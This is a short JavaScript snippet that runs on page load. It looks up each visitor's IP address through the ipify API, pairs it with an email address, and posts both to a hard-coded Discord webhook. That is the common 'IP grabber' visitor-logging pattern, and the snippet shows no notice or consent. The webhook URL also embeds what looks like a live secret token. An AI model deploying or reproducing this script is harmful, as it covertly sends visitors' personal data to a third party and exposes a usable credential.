function getEmail() {
  // This function assumes you have a way to get the user's email address
  // Replace this with your own implementation
  return "user@example.com";
}

// Get the user's IP address
function getIP(json) {
  // This function uses the ipify API to get the user's IP address
  // You can replace this with another API if you prefer
  return json.ip;
}

// Send the data to the Discord webhook
function sendData(ip, email) {
  const webhookUrl = "https://discord.com/api/webhooks/1289270629932990526/TTpXp3OTrYs1bxpu_oD9rxPsybEqYXx07BVShmwp8480m-jKMvWY0CykepkQiMQJf3uZ";
  const data = {
    "content": `User ${email} is accessing the site from IP ${ip}`,
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
}

// Get the user's IP address and email, then send the data
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(ipData => {
    const ip = getIP(ipData);
    const email = getEmail();
    sendData(ip, email);
  });